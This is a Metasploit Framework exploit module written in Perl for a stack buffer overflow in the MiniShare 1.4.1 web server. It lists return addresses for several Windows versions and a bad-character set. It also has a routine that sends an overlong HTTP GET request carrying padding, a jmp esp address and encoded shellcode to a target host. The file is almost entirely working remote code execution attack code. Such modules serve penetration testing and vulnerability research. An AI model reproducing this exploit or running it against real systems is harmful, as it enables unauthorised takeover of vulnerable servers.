##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::minishare_get_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;
my $advanced = { };

my $info =
  {
	'Name'  => 'Minishare 1.41 Buffer Overflow',
	'Version'  => '$Revision: 1.2 $',
	'Authors' => [ 'acaro <acaro [at] jervus.it>', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32' ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'     => 1024,
		'MinNops'	=> 64,
		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x40",
	#	'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",
		'Keys'      => ['+ws2ord'],
	  },
	  

	'Description'  => Pex::Text::Freeform(qq{
		This is a simple buffer overflow for the minishare web server. This 
	flaw affects all versions prior to 1.4.2. This is a plain stack overflow
	that requires a "jmp esp" to reach the payload, making this difficult to
	target many platforms at once. This module has been successfully tested 
	against 1.4.1. Version 1.3.4 and below do not seem to be vulnerable.

}),

	'Refs'  =>
	  [
		['OSVDB', 11530],
		['BID',   11620],
		['URL',   'http://archives.neohapsis.com/archives/fulldisclosure/2004-11/0208.html'],
	  ],

	'Targets' =>
	  [
		['Windows 2000 SP0-SP3 English', 1787, 0x7754a3ab ], # jmp esp
		['Windows 2000 SP4 English',     1787, 0x7517f163 ], # jmp esp
		['Windows XP SP0-SP1 English',   1787, 0x71ab1d54 ], # push esp, ret
		['Windows XP SP2 English',       1787, 0x71ab9372 ], # push esp, ret
		['Windows 2003 SP0 English',     1787, 0x71c03c4d ], # push esp, ret
	  ],

	'Keys' => ['minishare'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	my $pattern = Pex::Text::AlphaNumText($target->[1]);
	$pattern .= pack('V', $target->[2]);
	$pattern .= $shellcode;

	my $request = "GET " . $pattern ." HTTP/1.0\r\n\r\n";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using jmp esp at 0x%.8x...", $target->[2]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);
	$s->Recv(-1, 10);
	$s->Close();
	return;
}


